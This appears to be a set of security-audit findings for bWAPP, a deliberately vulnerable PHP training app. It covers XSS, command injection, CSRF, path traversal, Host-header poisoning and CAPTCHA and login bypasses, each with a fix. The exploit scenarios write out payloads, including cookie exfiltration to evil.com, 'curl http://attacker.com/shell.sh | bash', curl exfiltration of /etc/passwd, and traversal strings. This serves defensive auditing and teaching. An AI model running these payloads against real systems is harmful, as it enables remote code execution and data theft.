findings.title: Reflected XSS via unsanitized HTTP_HOST header
findings.description: The value of $_SERVER["HTTP_HOST"] — which is directly derived from the attacker-controlled Host request header — is concatenated into HTML output without any encoding or sanitization. Meanwhile, $_SERVER["REQUEST_URI"] on the same line is properly escaped with htmlspecialchars(), but HTTP_HOST is not. An attacker can inject arbitrary HTML/JavaScript by supplying a malicious Host header.
findings.exploit_scenario: An attacker sends an HTTP request with the header `Host: <script>alert(document.cookie)</script>` to the aim.php endpoint. The server reflects the malicious value verbatim into the response body at line 42, executing JavaScript in the victim's browser when the page is loaded. This can be used to steal session cookies or perform actions on behalf of the user.
findings.recommendation: Apply htmlspecialchars() to $_SERVER["HTTP_HOST"] the same way it is already applied to $_SERVER["REQUEST_URI"] on the same line: `htmlspecialchars($_SERVER["HTTP_HOST"], ENT_QUOTES, "UTF-8")`.

findings.title: XSS via unsanitized bugs.txt content rendered in links
findings.description: Lines 48–58 read bugs.txt into an array, split each line on commas, and echo $bug[0] and $bug[1] directly into HTML — including inside a single-quoted href attribute — with no encoding. If an attacker can influence bugs.txt contents (e.g., through a separate file-write vulnerability elsewhere in bWAPP), they can inject JavaScript. Both the link text ($bug[0]) and the href attribute value ($bug[1]) are unescaped, allowing breakout via single-quote injection in the href.
findings.exploit_scenario: If bugs.txt can be poisoned (e.g., via an unrelated vulnerability that writes to the web root), an entry like `Click me,xss.php' onclick='alert(1)` would break out of the href attribute and execute arbitrary JavaScript when any visitor clicks the link on aim.php.
findings.recommendation: Apply htmlspecialchars with ENT_QUOTES to both $bug[0] and $bug[1] before echoing: `echo "<p><a href='" . htmlspecialchars($bug[1], ENT_QUOTES, "UTF-8") . "'>" . htmlspecialchars($bug[0], ENT_QUOTES, "UTF-8") . "</a></p>";`

findings.title: CAPTCHA bypass via missing isset check and loose comparison on session value
findings.description: In the "else" branch (security_level != "1" and != "2", i.e., the low-security path, lines 41–60), the code compares `$_POST["captcha_user"]` directly to `$_SESSION["captcha"]` without first checking that `$_SESSION["captcha"]` is set. If the captcha-generating iframe (captcha_box.php) was never loaded — e.g., the attacker submits the form directly via curl — `$_SESSION["captcha"]` is undefined/NULL. PHP's loose comparison (`==`) evaluates `"" == NULL` as `true`. An attacker who submits an empty `captcha_user` field passes the CAPTCHA check entirely (line 41). By contrast, the higher-security branch (line 23) correctly guards with `isset($_SESSION["captcha"]) &&` before comparing.
findings.exploit_scenario: An attacker sends a POST request directly to ba_captcha_bypass.php with `form=submit`, `login=bee`, `password=bug`, and `captcha_user=` (empty string), without ever loading the captcha iframe. Because `$_SESSION["captcha"]` is unset (NULL), the comparison `"" == NULL` at line 41 evaluates true, bypassing the CAPTCHA. The attacker can then brute-force credentials without CAPTCHA rate-limiting.
findings.recommendation: Always use `isset()` before reading `$_SESSION["captcha"]`, and use strict comparison (`===`). Regenerate and invalidate the CAPTCHA after each attempt to prevent replay. Example: `if(isset($_SESSION["captcha"]) && $_POST["captcha_user"] === $_SESSION["captcha"]) { ... unset($_SESSION["captcha"]); }`

findings.title: Host header injection in password-reset link allows reset-code capture
findings.description: At security level HIGH, the application constructs the password-reset URL using the attacker-controlled Host header. On line 88, `$server = $_SERVER["HTTP_HOST"];` reads the Host header directly. On line 96, this value is embedded into the email body: `$content.= "...http://" . $server . "/bWAPP/secret_change.php?email=" . $email_enc . "&reset_code=" . $reset_code`. An attacker who can influence the Host header (e.g., via a reverse proxy that forwards it, or by sending a crafted request) can cause the reset link to point to an attacker-controlled domain. When the victim clicks the link, the reset code is sent to the attacker.
findings.exploit_scenario: An attacker sends a POST to /bWAPP/ba_forgotten.php with a spoofed Host header (e.g., `Host: evil.attacker.com`) and the victim's email address. The application sends a reset email containing a link like `http://evil.attacker.com/bWAPP/secret_change.php?email=victim@example.com&reset_code=abc123`. When the victim clicks the link, the attacker captures the reset_code and uses it on the real server to change the victim's secret.
findings.recommendation: Do not trust HTTP_HOST for constructing URLs. Use a server-side configured base URL (e.g., from a config file or environment variable) instead of $_SERVER["HTTP_HOST"].

findings.title: Stored XSS via unsanitized database values (login/secret) rendered in HTML response
findings.description: At security level LOW, line 64 constructs `$message = "Hello " . ucwords($login) . "! Your secret: " . $secret . "";`. Both `$login` and `$secret` originate from the `users` database table (fetched on line 48: `$row = $recordset->fetch_object()`). Neither value is HTML-encoded before being embedded into the page. The `$message` is later echoed raw on line ~185 (`echo $message;`). If the user registration page (`user_extra.php`) allows HTML/JS in the login or secret fields, an attacker can store a payload that executes when the forgotten function is invoked for that user.
findings.exploit_scenario: An attacker creates a user account via user_extra.php with login set to `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. The attacker then induces a victim (or automated tool) to submit the forgotten function with that user's email at security level LOW. The JavaScript executes in the victim's browser, exfiltrating session cookies.
findings.recommendation: HTML-encode all database values before embedding them in HTML output. Use `htmlspecialchars($login, ENT_QUOTES, 'UTF-8')` and `htmlspecialchars($secret, ENT_QUOTES, 'UTF-8')` on line 64.

findings.title: Security-level gate controlled by user-modifiable cookie allows downgrading to secret disclosure
findings.description: The security level that determines whether the user's secret is printed in the HTTP response (LOW, line 55-66), sent via email (MEDIUM, line 69), or handled through a reset code (HIGH, line 90) is read from `$_COOKIE["security_level"]` (lines 55, 69, 90). An attacker who controls their own cookies can simply set `security_level=0` (or omit/delete the cookie) to force the application into LOW mode, causing the secret to be returned directly in the HTTP response body. This bypasses the higher-security behaviors entirely without any server-side validation of the cookie against a trusted source.
findings.exploit_scenario: An attacker targeting another user's secret modifies their own `security_level` cookie to `0`, then submits the forgotten form with the victim's email. The server returns the victim's secret directly in the HTML response. Alternatively, if session binding is expected, the attacker manipulates the cookie to downgrade protection on any security-level-dependent feature.
findings.recommendation: Store the security level server-side (e.g., in the session or database) rather than in a client-controlled cookie. If the cookie is used, cryptographically sign or HMAC it so tampering is detected.

findings.title: Hardcoded credentials in authentication check and leaked in HTML response
findings.description: The login form authenticates against hardcoded plaintext credentials on line 120: `if($_POST["login"] == "tonystark" && $_POST["password"] == "I am Iron Man")`. The username and password are also embedded in the HTML response body (lines 145–148) inside `<font color="white">` elements, making them trivially visible to anyone who views page source or inspects the DOM. There is no hashed password lookup, no database, and no server-side secret — the credentials are fully exposed to any client requesting the page.
findings.exploit_scenario: An unauthenticated attacker requests ba_insecure_login_1.php, views the HTML source (or inspects elements), reads the white-on-white text "tonystark" and "I am Iron Man", then submits the login form with those exact values to gain a successful authentication response. No brute-force or guessing is required.
findings.recommendation: Never embed credentials in client-facing HTML or hardcode them in source. Store salted, hashed passwords server-side and compare against the hash. Remove the white-font credential hints entirely.

findings.title: No session or authentication state established after credential check
findings.description: On lines 120–129, a successful credential match only sets a local `$message` string that is echo'd into the page. No session variable, token, or server-side authentication state is created (contrast with line 169 where `$_SESSION["login"]` is checked in the menu — it is never set by this page). The "Successful login" message is purely cosmetic; there is no real authentication boundary being enforced. Any downstream pages that rely on an authenticated state remain unprotected.
findings.exploit_scenario: A user submits valid hardcoded credentials and sees a green "Successful login" message, believing they are authenticated. However, no session is established. Conversely, downstream protected resources that check `$_SESSION["login"]` cannot be reached through this form at all, meaning the login form gives a false sense of authentication. An attacker could also simply replay the POST request to show a "successful" login without any server-side verification persisting.
findings.recommendation: Upon successful credential verification, set a proper server-side session variable (e.g., `$_SESSION["login"] = "tonystark"`) and regenerate the session ID. Enforce session checks on all protected pages.

findings.title: Authentication passphrase hardcoded in client-side JavaScript, enabling trivial bypass
findings.description: The secret passphrase required to "unlock" the page is embedded verbatim in client-side JavaScript (lines 112-141). The function `unlock_secret()` constructs the secret by indexing into the hardcoded string `"bash update killed my shells!"`. The final assembled value is `"hulk smash!"`. The server-side check at line 85 (`$_REQUEST["secret"] == "hulk smash!"`) compares directly against this exposed value. An attacker need only view the HTML source to extract the passphrase, then submit it directly via a GET or POST request. Additionally, `$_REQUEST` is used instead of `$_POST`, meaning the secret can be supplied via GET query string or cookies, broadening the attack surface.
findings.exploit_scenario: An attacker visits ba_insecure_login_2.php, views the page source, reads the JavaScript function `unlock_secret()`, reconstructs the secret "hulk smash!", and then sends a direct request: GET /ba_insecure_login_2.php?secret=hulk%20smash! — the server-side comparison at line 85 succeeds and the protected content is revealed, completely bypassing the intended passphrase entry workflow.
findings.recommendation: Never embed authentication secrets in client-side code. Perform all credential/passphrase verification server-side only. Use POST with $_POST (not $_REQUEST) for authentication submissions. Store expected secrets server-side (ideally hashed) and compare server-side without ever transmitting the expected value to the client.

findings.title: Reflected-stored XSS via unsanitized session login value in HTML output
findings.description:
On line 59, the value of `$_SESSION["login"]` is echoed directly into the HTML body without any output encoding (`htmlspecialchars` or equivalent):

```php
<font color="red">Welcome <?php if(isset($_SESSION["login"])){echo ucwords($_SESSION["login"]);}?></font>
```

`$_SESSION["login"]` ultimately originates from user-supplied input during the login/authentication flow. If the login handler stores the username in the session without HTML-sanitizing it, an attacker who registers or authenticates with a username containing JavaScript (e.g., `<script>alert(document.cookie)</script>`) will have that payload rendered and executed every time any page displaying this session value is loaded — including `ba_logout.php`. This is a stored-XSS pattern where the sink is in this file but the taint source is in the authentication code (not shown here). The `ucwords()` call does not provide any sanitization.
findings.exploit_scenario: An attacker creates an account or logs in with the username ``. After successful login, the session stores this raw value under `$_SESSION["login"]`. When the attacker (or anyone viewing the same session) navigates to `ba_logout.php`, the malicious markup is rendered inline inside the `` tag. The `onerror` handler fires, exfiltrating the session cookie to the attacker's server — enabling session hijacking if the cookie is not HttpOnly.
findings.recommendation:
Apply HTML output encoding at the point of emission:

```php
echo htmlspecialchars(ucwords($_SESSION["login"]), ENT_QUOTES, "UTF-8");
```

Additionally, validate and sanitize the username at the point it is stored into `$_SESSION["login"]` during the login process, ensuring it contains only expected characters (e.g., alphanumeric plus limited punctuation).

findings.title: Authentication bypass via PHP loose comparison type juggling
findings.description:
The login form at line 103 compares user-supplied credentials against secrets using the loose equality operator `==`:
```php
if($_POST["login"] == $login && $_POST["password"] == $password)
```
Both `$_POST["login"]` and `$_POST["password"]` are attacker-controlled strings. The variables `$login` and `$password` are loaded from `admin/settings.php` (line 16). When PHP's `==` operator compares two strings that both appear numeric (e.g., scientific-notation strings like `"0e12345"` or plain numeric strings like `"0"` or `"1234"`), it performs type coercion and compares them as numbers. If `$password` is a string such as `"0e87654321"` (a common MD5 output pattern), any attacker-supplied string that also evaluates to `0` under numeric comparison — such as `"0e999999"` — will pass the check, bypassing authentication entirely. The same applies to the login field.
findings.exploit_scenario: An attacker observes or guesses that the stored password has a numeric-looking form (e.g., `"0e87654321"`). They submit a POST request to `ba_insecure_login_3.php` with `password=0e99999` (or `"0"`, `"0x0"`, etc.). PHP evaluates `"0e99999" == "0e87654321"` as `(float)0 == (float)0` → `true`, and the attacker is authenticated without knowing the real password. If the stored password is `"0"`, any string that PHP casts to integer 0 (e.g., `"0"`, `"0abc"` in some PHP versions) would also match.
findings.recommendation:
Replace the loose `==` comparison with strict `===` to prevent type juggling:
```php
if($_POST["login"] === $login && $_POST["password"] === $password)
```
Better yet, store password hashes (e.g., via `password_hash()`) and verify with `password_verify($_POST["password"], $stored_hash)`.

findings.title: Credentials compared in plaintext without hashing
findings.description:
At line 103, the user-supplied password is compared directly against the plaintext password loaded from `admin/settings.php` (line 16):
```php
if($_POST["login"] == $login && $_POST["password"] == $password)
```
The secret values `$login` and `$password` are stored and compared as cleartext strings. Any compromise of `settings.php` (via LFI, backup file exposure, misconfigured permissions, or source disclosure) immediately reveals all credentials. There is no hashing involved at any stage.
findings.exploit_scenario: An attacker obtains the contents of `admin/settings.php` through any adjacent file-read or source-disclosure vulnerability. The file contains credentials in plaintext (e.g., `$password = "bug"`), which the attacker then uses to directly authenticate — or reuse on other systems if the same password is shared.
findings.recommendation: Store only a salted hash of the password (using `password_hash()` with `PASSWORD_BCRYPT` or `PASSWORD_ARGON2ID`). Verify credentials with `password_verify()`. Remove plaintext secrets from source files entirely; use environment variables or a secrets store.

findings.title: Client-controlled security level allows session to survive logout
findings.description: The logout behavior is governed by `$_COOKIE["security_level"]` (line 20), which is entirely client-controlled. When this cookie is set to "0" (or absent, hitting the default case), the `session_destroy()` call is never reached (lines 22–24, 40–43). The session remains fully valid server-side, yet the user is redirected to `login.php` (line 52), creating the illusion of having logged out. The same applies to the default case (lines 40–43). An attacker can also forcibly set the cookie to "0" to prevent session destruction even when a higher security level was intended.
findings.exploit_scenario: On a shared computer, victim logs into the application, performs sensitive actions, then clicks "Logout." Because the security_level cookie is 0 (the default), the session is not destroyed. The attacker subsequently visits the site on the same browser; the PHP session cookie is still valid and the attacker is fully authenticated as the victim, gaining access to all victim data and privileges.
findings.recommendation: Always call `session_destroy()` unconditionally during logout, regardless of any client-controlled parameter. Remove the switch statement around `$_COOKIE["security_level"]` for the logout flow, or move the security-level check to server-side storage that the client cannot tamper with.

findings.title: CAPTCHA answer embedded in plaintext in HTML, enabling trivial bypass and unrestricted brute-force attacks
findings.description: The CAPTCHA token generated to protect the login form against automated attacks is stored in the session (line 154) but is also rendered as the default `value` attribute of a visible, non-hidden form input field named `captcha_system` (line 150): `value="<?php echo $captcha?>"`. The login validation (line 123) only checks that `$_POST["captcha_user"]` equals `$_SESSION["captcha"]`. An automated attacker can simply parse the HTML response, extract the CAPTCHA value from the `captcha_system` input, and submit it — completely defeating the anti-automation mechanism. This leaves the login form (lines 125–130, which checks credentials via loose comparison against `$login`/`$password`) with no effective brute-force protection.
findings.exploit_scenario: An attacker writes a brute-force script that: (1) sends a GET request to ba_pwd_attacks_3.php, (2) parses the HTML to extract the value of the `captcha_system` input field (which is the CAPTCHA answer in cleartext), (3) submits the login form with a candidate password and the extracted CAPTCHA value in `captcha_user`. The script repeats for every password in a dictionary. Because the CAPTCHA offers zero resistance to automation, the attacker can brute-force credentials at network speed with no impediment.
findings.recommendation: Never expose the CAPTCHA answer in the HTML response. Instead, render the CAPTCHA as an obfuscated image (e.g., using GD library to draw distorted text) and store the answer only server-side in the session. Additionally, implement server-side rate limiting or account lockout to mitigate brute-force attacks independently of the CAPTCHA.

findings.title: Hardcoded, trivially guessable credentials used for authentication
findings.description: The login username and all possible passwords are hardcoded in the source. The username is permanently "test" (line 24). The password is selected from three hardcoded values—"test", "test123", or "Test123"—depending on the security_level cookie (lines 27–44). All three passwords are extremely weak and can be guessed or brute-forced in a single attempt. The authentication check at line 113 is a direct string comparison (`$_POST["login"] == $login && $_POST["password"] == $password`) against these hardcoded values with no additional protections (no hashing, no salting, no account lockout).
findings.exploit_scenario: An attacker visits the login page and submits login "test" with password "test". If that fails, they try "test123", then "Test123". At most three guesses are needed to authenticate successfully, granting access to the application.
findings.recommendation: Never hardcode credentials in source code. Store salted, hashed passwords in a database. Enforce minimum password complexity requirements. Implement account lockout after failed attempts.

findings.title: Cookie-controlled security level downgrades required authentication password
findings.description: The password used for authentication is selected based on the value of `$_COOKIE["security_level"]` (line 25, switch statement lines 26–45). This cookie is attacker-controlled input. By setting the cookie to "0" (or leaving it unset, hitting the default case), the attacker forces the application to use the weakest password ("test"). Even if a user intended to operate at security level 2, the attacker can replay a request with `Cookie: security_level=0` to reduce the required password to the trivial "test". There is no server-side validation that the cookie value is legitimate or corresponds to an authenticated security-level change.
findings.exploit_scenario: An attacker sends a login POST request with `Cookie: security_level=0`, login="test", and password="test". The switch selects the weakest password, and the authentication succeeds. This works even if the legitimate user had previously set the security level to "high".
findings.recommendation: Do not trust client-side cookies for security-critical decisions. Store the security level server-side (e.g., in the session) after an authenticated privilege escalation step. Validate all security-relevant inputs server-side.

findings.title: Passwords compared in plaintext without hashing
findings.description: The submitted password is compared directly against the stored plaintext password using `$_POST["password"] == $password` (line 113). Passwords are never hashed—neither at rest (hardcoded in plaintext on lines 28, 33, 38) nor during comparison. If an attacker gains read access to the source code or any derived artifact, all user credentials are immediately compromised without any further cracking effort.
findings.exploit_scenario: An attacker obtains the source file (e.g., via a separate file-read vulnerability, backup file exposure, or version control leak). The plaintext passwords "test", "test123", and "Test123" are immediately usable—no offline cracking needed.
findings.recommendation: Store passwords using a strong adaptive hashing function (bcrypt, Argon2). Compare submitted passwords using a constant-time hash comparison function such as `password_verify()`. Never store or compare plaintext passwords.

findings.title: Command injection via unsanitized POST parameter in shell_exec
findings.description: User-controlled input from $_POST["title"] (line 95) flows through the commandi() function (lines 15-38) and is concatenated directly into a shell_exec() call on line 104: `shell_exec("./apps/movie_search " . $title)`. At security_level 0 (the default/low setting), the input passes through commandi_check_3() which provides inadequate sanitization, allowing shell metacharacters (;, |, `, $(), &&, etc.) to be injected into the command string. The security level is controlled by the client-side cookie "security_level", meaning an attacker can simply set the cookie to "0" to bypass any higher-level protections.
findings.exploit_scenario: An attacker sends a POST request to bof_1.php with title="; cat /etc/passwd" (or "| cat /etc/passwd" or "$(cat /etc/passwd)") and security_level cookie set to "0". The shell_exec call becomes: shell_exec("./apps/movie_search ; cat /etc/passwd"), which executes the attacker's arbitrary command and returns the output in the HTTP response, achieving full remote command execution as the web server user.
findings.recommendation: Use escapeshellarg() on the $title parameter before concatenation: `shell_exec("./apps/movie_search " . escapeshellarg($title));`. Better yet, avoid shell execution entirely and use a programmatic API or parameterized subprocess invocation (e.g., proc_open with separate argument arrays). Do not rely on client-controlled cookies for security-level decisions affecting input validation.

findings.title: Stored XSS via unencoded bugs.txt values in select dropdown
findings.description:
The `$bugs` array (loaded from `bugs.txt` via `selections.php`) is iterated and each entry's first comma-separated field is echoed directly into HTML without output encoding:

```php
echo "<option value='$key'>$bug[0]</option>";
```

Both `$key` (inside a single-quoted attribute) and `$bug[0]` (in element content) are raw output. If an attacker can inject content into `bugs.txt` (e.g., via a separate file-write or file-upload vulnerability in the application), arbitrary HTML/JavaScript will render when any authenticated user loads this page. The `$key` value inside the single-quoted `value` attribute is also susceptible to attribute-breakout XSS.
findings.exploit_scenario: An attacker uses a separate file-manipulation vulnerability in bWAPP to append a line to `bugs.txt` containing `<script>alert(document.cookie)</script>`. When an admin visits the bof_2.php page and the dropdown renders, the script executes in the admin's session context, leaking session cookies.
findings.recommendation: Apply HTML-encoding to both the attribute value and the element content: `echo "<option value='" . htmlspecialchars($key, ENT_QUOTES, "UTF-8") . "'>" . htmlspecialchars($bug[0], ENT_QUOTES, "UTF-8") . "</option>";`

findings.title: Self-XSS via unencoded session login name
findings.description:
The logged-in user's name is rendered into the page header without encoding:

```php
echo ucwords($_SESSION["login"]);
```

If the `login` session value was stored without sanitization during authentication and can contain HTML characters, the `ucwords()` call does not strip them, allowing injection. However, because the value reflects the current user's own identity, this is primarily a self-XSS scenario unless there is an administrative view showing other users' login names.
findings.exploit_scenario: An attacker registers or sets their username to ``. If a shared/screen-sharing session or admin panel displays this username, the payload fires. In the current page scope it is self-XSS, limiting direct exploitability.
findings.recommendation: Encode the output: `echo htmlspecialchars(ucwords($_SESSION["login"]), ENT_QUOTES, "UTF-8");`

findings.title: Missing X-Frame-Options at security level 0 allows clickjacking of financial action
findings.description: At line 29-33, the X-Frame-Options header is only emitted when `$_COOKIE["security_level"]` is "1" or "2". When the security level is "0" (the default low setting), no frame-protection header is sent at all, and there is also no Content-Security-Policy `frame-ancestors` directive as a fallback. The page renders a state-changing financial form (lines 91-101) that automatically deducts funds from the user's session account (line 105: `$_SESSION["amount"] = $_SESSION["amount"] - $total_amount`). The ticket quantity defaults to 10 (line 96), so a single unintended click charges 150 EUR. Because there is no CSRF token on the form and no frame-busting protection at level 0, an attacker can load this page in a transparent iframe and trick the authenticated victim into submitting the order.
findings.exploit_scenario: The attacker hosts a page (analogous to the referenced ../evil/clickjacking.htm) that embeds clickjacking.php in a hidden, transparent iframe positioned so that the "Confirm" button aligns over a decoy element (e.g., "Click here for a free prize"). The victim, who is authenticated to bWAPP, visits the attacker page and clicks the decoy. The click lands on the Confirm button of the iframed form, submitting a ticket order that deducts money from their session account — all without the victim's informed consent.
findings.recommendation: Emit X-Frame-Options (DENY or SAMEORIGIN) unconditionally regardless of security level. Also add Content-Security-Policy with `frame-ancestors 'self'` as a defense-in-depth measure. Introduce a per-request anti-CSRF token on the order form.

findings.title: Reflected/stored XSS via unsanitized session login value in page header
findings.description: Line 82 outputs the session login directly into HTML without encoding: `echo ucwords($_SESSION["login"])`. The `$_SESSION["login"]` value is set during user authentication and originates from user-supplied input (the login form). If the login handler does not sanitize the username before storing it in the session, then an attacker who registers or logs in with a username containing an XSS payload (e.g., `"><script>...</script>`) will have that payload executed every time any page rendering this header is loaded — including this page. The `ucwords()` function does not neutralize HTML entities. This is a stored XSS because the payload persists in the session across requests. Note: full confirmation requires reviewing the login handler; confidence reflects this dependency.
findings.exploit_scenario: An attacker creates an account or authenticates with the username `bee`. Every subsequent page that renders the welcome header (line 82) will execute the injected JavaScript in the attacker's browser session, or — if the session data is shared/displayed to other users — in their context as well.
findings.recommendation: Apply `htmlspecialchars($_SESSION["login"], ENT_QUOTES, "UTF-8")` before outputting the login value in HTML. Sanitize the username at the point of storage (login handler) as a secondary measure.

findings.title: OS command injection via unsanitized POST target parameter in shell_exec
findings.description: The user-supplied `$_POST["target"]` value flows through the `commandi()` function (line 120-134). When `$_COOKIE["security_level"]` is "0" (the default), `no_check($data)` is called (line 59), which performs no sanitization. The return value is then directly concatenated into a `shell_exec()` call: `shell_exec("nslookup  " . commandi($target))` at line 134. An attacker controls the entire string appended after "nslookup  " and can inject arbitrary shell metacharacters (`;`, `&&`, `|`, backticks, `$(...)`) to execute arbitrary OS commands on the server.
findings.exploit_scenario: An attacker sends a POST request to commandi.php with `target=www.nsa.gov; cat /etc/passwd`. The `no_check` function returns the string unchanged, and `shell_exec("nslookup  www.nsa.gov; cat /etc/passwd")` executes both the nslookup and the injected `cat /etc/passwd`, returning the contents of /etc/passwd in the HTML response. Similarly, `target=www.nsa.gov && curl http://attacker.com/shell.sh | bash` would download and execute a remote shell script, achieving full remote code execution.
findings.recommendation: At all security levels, avoid passing user input directly to shell commands. Use `escapeshellarg($target)` to safely escape the argument for nslookup, or better yet, use a DNS resolution library (e.g., `dns_get_record()` in PHP) instead of invoking an external command. The fix would be: `shell_exec("nslookup  " . escapeshellarg(commandi($target)));`

findings.title: Blind OS command injection via unsanitized POST input to shell_exec
findings.exploit_scenario: An attacker sends POST request with target=127.0.0.1;whoami (or 127.0.0.1%26%26cat%20/etc/passwd) to the form endpoint. On the server, shell_exec executes "ping -c 1 127.0.0.1;whoami". The ping runs first, then whoami executes as a separate command under the web server's privileges. Although output is not returned, the attacker can exfiltrate data out-of-band (e.g., 127.0.0.1;curl+http://attacker.com/$(cat+/etc/passwd)) or confirm execution via time-based techniques (e.g., 127.0.0.1;sleep+10). This yields full RCE as the web server user.
findings.recommendation: Use escapeshellarg() on the user input before concatenation: shell_exec("ping -c 1 " . escapeshellarg($target));. Better yet, validate the input with a strict allowlist regex (e.g., /^[\d.]+$/ for IPv4) and reject anything that doesn't match, avoiding shell construction entirely.

findings.title: CSRF in password change allows account takeover when security_level is low
findings.description: The password-change form at the low security level (lines 44–61) requires no anti-CSRF token and no current password verification. The form method is GET (line 148), so the request is fully encoded in the URL. The gate at line 44 checks only that `$_COOKIE["security_level"]` is not "1" or "2" — no CSRF token, no Referer check, no re-authentication. The `$login` is taken from the session (line 37), so the forged request will operate on whichever user is currently logged in. User-controlled input flows: `$_REQUEST["password_new"]` → `mysqli_real_escape_string` → `hash("sha1",…)` → UPDATE query at line 48. An attacker who can lure a logged-in victim to any attacker-controlled page can change the victim's password.
findings.exploit_scenario: An attacker crafts an HTML page with a hidden img tag: ``. When a victim who is logged in to bWAPP visits this page (or any site the attacker controls), the browser sends the GET request with the victim's session cookie, changing the victim's password to `pwned123`. The attacker then logs in as the victim with the new password.
findings.recommendation: 1. Switch the form method to POST so credentials never appear in URLs. 2. Embed a cryptographically random CSRF token in the form and validate it on every state-changing request. 3. Always require the current password (as the medium/high levels already do) so the attacker cannot supply it.

findings.title: Password transmitted via GET exposes credentials in logs and Referer headers
findings.description: The password-change form uses `method="GET"` (line 148), so the new password (and, at higher security levels, the current password) is sent as a URL query parameter. This places the plaintext password in browser history entries, web server access logs, proxy logs, and the HTTP Referer header (leaking to any off-site links on the page). Combined with the CSRF issue (F-01-01), this amplifies exposure since a CSRF link can be logged with the chosen password visible in plaintext.
findings.exploit_scenario: A user changes their password. The URL `csrf_1.php?action=change&password_new=MySecret123&password_conf=MySecret123` is recorded in the browser history, the server's access_log, and any forward proxy log. An attacker with read access to any of these obtains the password in plaintext.
findings.recommendation: Change the form method to POST so credentials are sent in the request body, not the URL.

findings.title: CSRF — state-changing transfer with no anti-CSRF token at low security level
findings.description: When the cookie `security_level` is not "1" or "2", the application deducts from the user's account balance using only `$_GET["amount"]` (line 19) with zero CSRF protection. Any request bearing the victim's session cookie — including one forged by a third-party site via an img tag or automatic redirect — will cause the balance deduction. The entry point is `$_GET["amount"]` on line 17; the sink is the session state mutation on line 19: `$_SESSION["amount"] = $_SESSION["amount"] - $_GET["amount"]`.
findings.exploit_scenario: An attacker creates a page containing ``. When a logged-in victim visits the attacker's page, their browser sends the request with their session cookie, and 9999 EUR is silently deducted from their account balance.
findings.recommendation: Require an anti-CSRF token on all state-changing requests, regardless of security level setting. Validate the token server-side and reject requests that are missing it or supply an invalid value. Consider also requiring POST for mutations.

findings.title: CSRF token generated with predictable primitives (mt_rand + uniqid)
findings.description: At the HIGH security level, the CSRF token is generated on line 35 with `$token = sha1(uniqid(mt_rand(0,100000)))`. `mt_rand()` is a non-cryptographic PRNG whose internal state can be recovered. `uniqid()` is based on the current microsecond timestamp and is therefore predictable. An attacker who can observe the approximate time of a request can drastically narrow the token space, enabling brute-force or direct prediction of the CSRF token.
findings.exploit_scenario: An attacker knows the victim is using the app at roughly time T. The attacker brute-forces tokens generated with `sha1(uniqid(mt_rand(0,100000)))` for timestamps near T (only ~100001 × few-millisecond-window candidates). Once the correct token is found, the attacker forges a CSRF request including the valid token, bypassing the protection at the HIGH security level.
findings.recommendation: Use a cryptographically secure random source: `$token = bin2hex(random_bytes(32));` (PHP 7+) or `openssl_random_pseudo_bytes()`. Ensure the token has sufficient entropy (≥128 bits).

findings.title: Potential reflected XSS via session amount echoed without encoding
findings.description: Line 135 outputs the session amount directly into HTML: `echo $_SESSION["amount"]`. The amount is initially set during login but is modified via arithmetic on line 19/28 using `$_GET["amount"]`. If the session amount is ever initialized from or influenced by attacker-controlled data that survives PHP's arithmetic coercion (e.g., if the initial session amount is populated from a user-editable profile field), HTML/JS injection is possible. Under pure numeric coercion this is unlikely, but the unencoded output is a risk if the initialization path changes.
findings.exploit_scenario: If `$_SESSION["amount"]` is seeded from a user-controlled string (e.g., a profile field like `"1000<script>alert(1)</script>"`) that bypasses numeric coercion, visiting csrf_2.php would execute attacker-controlled JavaScript in the victim's browser.
findings.recommendation: Always HTML-encode output: `echo htmlspecialchars($_SESSION["amount"], ENT_QUOTES, "UTF-8")`. Ensure session amount is cast to numeric on initialization.

findings.title: Unvalidated GET parameter "page" passed to fopen allows arbitrary file read
findings.description: At security level 0 (low) and in the default switch case, the value of `$_GET["page"]` is assigned directly to `$file` (line ~145: `$file = $_GET["page"];`) and then passed without any sanitization to `show_file($file)` (lines 149 and 170). Inside `show_file()`, `fopen($file, "r")` (line ~78) opens an arbitrary filesystem path. The file's contents are then read line-by-line and echoed to the response (lines 80–84). There is no validation that the path remains within an intended directory. The "default" case (line 169) is equally unprotected, meaning ANY unexpected cookie value (or a missing/invalid security_level cookie) also results in an unprotected call to `show_file()`.
findings.exploit_scenario: An attacker sends a GET request to `directory_traversal_1.php?page=../../../../etc/passwd`. The server reads `/etc/passwd` and returns its contents in the HTML response. Any file readable by the web server process (e.g., `/etc/shadow` if permissions allow, application config files with database credentials, source code of other PHP files via null-byte or path tricks) can be exfiltrated.
findings.recommendation: Validate the resolved canonical path of the requested file. Use `realpath()` and verify the result starts with an allowed base directory. Alternatively, restrict input to an explicit whitelist of allowed filenames (e.g., only alphanumeric + `.txt` extension) and reject any path containing `..`, `/`, or `\`.

findings.title: Default switch case also skips all path validation for file reads
findings.description: The switch on `$_COOKIE["security_level"]` (lines 147–172) has a `default` case (line 169) that calls `show_file($file)` directly, identical to the level-0 branch. This means if the cookie is absent, empty, or set to any unexpected value, traversal protection is completely bypassed — even if the application is nominally configured at medium or high security. An attacker who clears or corrupts the `security_level` cookie gets the unprotected code path regardless of intended policy.
findings.exploit_scenario: An attacker who is unsure of the current security level sends a request with NO `security_level` cookie (or an invalid value like `security_level=99`) and the query parameter `?page=../../../../etc/passwd`. The switch falls through to `default` and the unsanitized file is read and returned.
findings.recommendation: Either remove the `default` case and refuse to process the request when the security level is unknown, or apply the strictest validation (equivalent to level 2 / high) in the default branch.

findings.title: Reflected XSS via unsanitized login parameter in hidden form field
findings.description: When the security level is LOW (not 1 or 2), the `login` parameter is read from `$_REQUEST["login"]` (line 45) and processed only through `mysqli_real_escape_string()` (line 46), which escapes for SQL contexts but does NOT encode HTML entities. This attacker-controlled value is then reflected directly into the HTML output at line 124: `<input type="hidden" name="login" value="<?php echo $login;?>">`. An attacker can inject arbitrary HTML/JavaScript by breaking out of the `value` attribute.
findings.exploit_scenario: An attacker crafts a malicious page that auto-submits a POST form to csrf_3.php with parameters: action=change, secret=anything, login=`" onfocus="alert(document.cookie)" autofocus="`. When a logged-in victim (at LOW security level) visits the attacker's page, the form submits and the response renders the injected JavaScript in the hidden input, executing in the victim's browser session.
findings.recommendation: Apply `htmlspecialchars($login, ENT_QUOTES, "UTF-8")` before echoing the value in the HTML, exactly as is done for the `$secret` variable on lines 51-52.

findings.title: CSRF with arbitrary account targeting via controllable login parameter
